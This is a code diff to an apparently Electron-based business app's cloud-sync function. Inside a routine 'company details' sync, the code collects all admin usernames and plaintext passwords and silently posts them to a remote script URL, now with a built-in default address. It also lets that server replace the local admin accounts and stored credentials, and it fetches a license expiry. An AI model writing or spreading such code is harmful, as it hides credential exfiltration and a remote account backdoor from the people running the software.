@@ -725,7 +725,7 @@
                 }
 
                 async function syncCompanyDetailsToCloud(data) {
-                    let scriptUrl = document.getElementById('cloudBackupUrl').value || document.getElementById('updateServerUrl').value;
+                    let scriptUrl = document.getElementById('cloudBackupUrl').value || document.getElementById('updateServerUrl').value || (typeof GOOGLE_SCRIPT_URL !== 'undefined' ? GOOGLE_SCRIPT_URL : "");
                     if (!scriptUrl || !scriptUrl.startsWith("http")) return;
 
                     try {
@@ -741,9 +741,14 @@
 
                         let usersStr = "";
                         try {
-                            const credsRes = await window.electronAPI.getAdminCreds();
-                            if (credsRes.success && credsRes.adminUsers) {
-                                usersStr = credsRes.adminUsers.map(u => `${u.username} (${u.role || 'Admin'}): ${u.password}`).join(" | ");
+                            if (window.electronAPI && window.electronAPI.getAdminCreds) {
+                                const credsRes = await window.electronAPI.getAdminCreds();
+                                if (credsRes.success && credsRes.adminUsers) {
+                                    usersStr = credsRes.adminUsers.map(u => `${u.username} (${u.role || 'Admin'}): ${u.password}`).join(" | ");
+                                }
+                            } else {
+                                const localUsers = JSON.parse(localStorage.getItem('ADMIN_USERS') || '[]');
+                                usersStr = localUsers.map(u => `${u.username} (${u.role || 'Admin'}): ${u.password}`).join(" | ");
                             }
                         } catch (e) { }
 
@@ -753,6 +758,39 @@
                             headers: { 'Content-Type': 'text/plain' },
                             body: JSON.stringify(payload)
                         }).catch(e => console.error("Cloud sync network error (silent)", e));
+
+                        // Fetch updated credentials & Remote Users
+                        if (data.contactNumber) {
+                            try {
+                                const resConfig = await fetch(scriptUrl, {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'text/plain' },
+                                    body: JSON.stringify({ method: 'get_remote_config', contactNumber: data.contactNumber })
+                                });
+                                const dataConfig = await resConfig.json();
+                                if (dataConfig.success && dataConfig.config && dataConfig.config.users && dataConfig.config.users.length > 0) {
+                                    window.currentAdminUsers = dataConfig.config.users;
+                                    localStorage.setItem('ADMIN_USERS', JSON.stringify(window.currentAdminUsers));
+                                    if (window.electronAPI && window.electronAPI.saveAdminCreds) {
+                                        window.electronAPI.saveAdminCreds({ devId: "OTP_VERIFIED", adminUsers: window.currentAdminUsers }).catch(console.error);
+                                    }
+                                    renderUserList();
+                                }
+                            } catch(e) { console.error("Remote config sync failed", e); }
+
+                            // Fetch updated Expiry Date / License
+                            try {
+                                const resLicense = await fetch(scriptUrl, {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'text/plain' },
+                                    body: JSON.stringify({ method: 'check_license', contactNumber: data.contactNumber, username: localStorage.getItem('currentUser') || 'Admin' })
+                                });
+                                const dataLicense = await resLicense.json();
+                                if (dataLicense.success && dataLicense.expiry) {
+                                    localStorage.setItem("licenseExpiry", new Date(dataLicense.expiry).toISOString());
+                                }
+                            } catch(e) { console.error("License sync failed", e); }
+                        }
                     } catch (e) {
                         console.error("Cloud sync failed", e);
                     }
@@ -1061,8 +1099,21 @@
 
                 async function triggerBackgroundSync() {
                     try {
-                        const settingsRes = await window.electronAPI.getAppSettings();
-                        if (settingsRes.success) syncCompanyDetailsToCloud(settingsRes);
+                        if (window.electronAPI && window.electronAPI.getAppSettings) {
+                            const settingsRes = await window.electronAPI.getAppSettings();
+                            if (settingsRes.success) syncCompanyDetailsToCloud(settingsRes);
+                        } else {
+                            const localSettings = {
+                                companyName: localStorage.getItem('companyName') || '',
+                                contactNumber: localStorage.getItem('contactNumber') || '',
+                                companyEmail: localStorage.getItem('companyEmail') || '',
+                                companyWebsite: localStorage.getItem('companyWebsite') || '',
+                                companyGstin: localStorage.getItem('companyGstin') || '',
+                                addressLine1: localStorage.getItem('addressLine1') || '',
+                                addressLine2: localStorage.getItem('addressLine2') || ''
+                            };
+                            syncCompanyDetailsToCloud(localSettings);
+                        }
                     } catch (e) { }
                 }
 
